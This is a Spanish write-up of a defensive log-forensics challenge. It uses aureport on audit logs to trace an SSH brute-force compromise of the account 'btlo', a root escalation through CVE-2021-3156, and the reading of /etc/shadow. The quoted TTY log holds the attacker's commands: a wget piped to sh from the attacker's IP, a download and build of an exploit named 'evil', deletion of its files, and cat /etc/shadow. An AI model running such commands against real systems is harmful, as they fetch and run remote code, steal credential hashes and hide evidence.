

Para este análisis estaremos usando `aureport`, que es una herramienta para generar informes resumidos a partir de los registros de auditoría del sistema.

Podemos usar el siguiente comando para ver la información general. 

```bash 
┌──(kali㉿kali)-[~/challenges/paranoid/Challenge Files]
└─$ cat analisis

Summary Report
======================
Range of time in logs: 10/04/2021 20:22:07.664 - 10/04/2021 20:28:06.610
Selected time for report: 10/04/2021 20:22:07 - 10/04/2021 20:28:06.610
Number of changes in configuration: 15
Number of changes to accounts, groups, or roles: 0
Number of logins: 1
Number of failed logins: 87
Number of authentications: 3
Number of failed authentications: 89
Number of users: 3
Number of terminals: 10
Number of host names: 6
Number of executables: 115
Number of commands: 192
Number of files: 298
Number of AVC's: 0
Number of MAC events: 0
Number of failed syscalls: 1606
Number of anomaly events: 0
Number of responses to anomaly events: 0
Number of crypto events: 0
Number of integrity events: 0
Number of virt events: 0
Number of keys: 1
Number of process IDs: 10679
Number of events: 16728
```

Así que empezammos con las preguntas: 

-----

1, What account was compromised? 

Para esto podemos usar el siguiente comando: 

```bash 
┌──(kali㉿kali)-[~/challenges/paranoid/Challenge Files]
└─$ aureport -l -if audit.log
Error opening config file (Permission denied)
NOTE - using built-in logs: /var/log/audit/audit.log

Login Report
============================================
# date time auid host term exe success event
============================================
1. 10/04/2021 20:22:41 btlo 192.168.4.155 sshd /usr/sbin/sshd no 465432
2. 10/04/2021 20:22:41 btlo 192.168.4.155 sshd /usr/sbin/sshd no 465434
3. 10/04/2021 20:22:41 btlo 192.168.4.155 sshd /usr/sbin/sshd no 465436
<SNIP>
87. 10/04/2021 20:23:08 btlo 192.168.4.155 sshd /usr/sbin/sshd no 467229
88. 10/04/2021 20:23:16 1001 192.168.4.155 /dev/pts/1 /usr/sbin/sshd yes 468383
```

Vemos una conexión desde la misma ip así que podemos asumir que la cuenta que se comprometió fue `btlo`

----

2. What attack type was used to gain initial access?

Por lo que vemos en el primer análisis, con la cantidad de inicios de sesión fallidos, podemos afirmar que se trata de un ataque de fuerza bruta(brute force). 

-------

3. What is the attacker's IP address?

Podemos verlo en los registros de la pregunta 1: `192.168.4.155`.

-----

4. 

Para esto podemos usar el siguiente comando:

```bash 
┌──(kali㉿kali)-[~/challenges/paranoid/Challenge Files]
└─$ aureport --tty -if audit.log
Error opening config file (Permission denied)
NOTE - using built-in logs: /var/log/audit/audit.log

TTY Report
===============================================
# date time event auid term sess comm data
===============================================
1. 10/04/2021 20:23:16 468403 1001 pts1 49 sh "hostname",<nl>
2. 10/04/2021 20:23:21 468408 1001 pts1 49 sh "whoami",<nl>
3. 10/04/2021 20:23:26 468414 1001 pts1 49 sh "ls",<nl>
4. 10/04/2021 20:23:27 468419 1001 pts1 49 sh "sudo -l",<nl>
5. 10/04/2021 20:23:34 468447 1001 pts1 49 sh <nl>
6. 10/04/2021 20:23:37 468450 1001 pts1 49 sh "wget -O - http://192.168.4.155:8000/linpeas.sh | sh",<nl>
7. 10/04/2021 20:26:21 480914 1001 pts1 49 sh "lsb_release -a",<nl>
8. 10/04/2021 20:26:31 480921 1001 pts1 49 sh "sudo -V",<nl>
9. 10/04/2021 20:26:36 480934 1001 pts1 49 sh "wget http://192.168.4.155:8000/evil.tar.gz",<nl>
10. 10/04/2021 20:26:45 480944 1001 pts1 49 sh "ls",<nl>
11. 10/04/2021 20:26:50 480947 1001 pts1 49 sh "tar zxvf evil.tar.gz",<nl>
12. 10/04/2021 20:26:59 480982 1001 pts1 49 sh "cd evil",<nl>
13. 10/04/2021 20:27:03 480984 1001 pts1 49 sh "ls",<nl>
14. 10/04/2021 20:27:06 480987 1001 pts1 49 sh "make",<nl>
15. 10/04/2021 20:27:10 481020 1001 pts1 49 sh "./evil 0",<nl>
16. 10/04/2021 20:27:17 481039 1001 pts1 49 sh "whoami",<nl>
17. 10/04/2021 20:27:21 481050 1001 pts1 49 sh "rm -rf /home/btlo/evil",<nl>
18. 10/04/2021 20:27:39 481059 1001 pts1 49 sh "rm  /home/btlo/evil.tar.gz",<nl>
19. 10/04/2021 20:27:45 481062 1001 pts1 49 sh "cat /etc/shadow",<nl>
20. 10/04/2021 20:27:50 481064 1001 pts1 49 sh "exit",<nl>
21. 10/04/2021 20:27:53 481065 1001 pts1 49 sh "exit",<nl>
```

`linpeas.sh` es una herramienta de enumeración en sistemas linux para detección de vulnerabilidades y escalada de privilegios. 

------

5. What is the name of the binary and pid used to gain root?

Por las acciones vistas en la pregunta anterior, vemos que primero revisa el usuario al que ha ganado acceso, obtiene una herramienta para escalar privilegios para finalmente volver a comprobar su usuario y leer el /etc/shadow, que necesita permisos de administrador. 

Así que buscamos ese programa llamado `evil`: 

```bash 
┌──(kali㉿kali)-[~/challenges/paranoid/Challenge Files]
└─$ aureport -p -if audit.log | grep "evil"
Error opening config file (Permission denied)
NOTE - using built-in logs: /var/log/audit/audit.log
16152. 10/04/2021 20:27:17 829992 /home/btlo/evil/evil 59 1001 481021
```

------

6. What CVE was exploited to gain root access?

Primero vemos que el atacante ejecutó el comando `sudo -V` y después obtuvo permisos de root con un ejecutable, así que podemos aplicar una búsqueda en internet con "binary execution to root linux", encontraremos que se trata del /cve-2021-3156. 

------

7. 

De acuerdo a la página del [CVE](https://nvd.nist.gov/vuln/detail/cve-2021-3156), se trata de un `heap-based buffer overflow`. 

------

8. What file was exfiltrated once root was gained?

Por los comandos vistos en la pregunta 2, vimos que se accedió al `/etc/shadow`
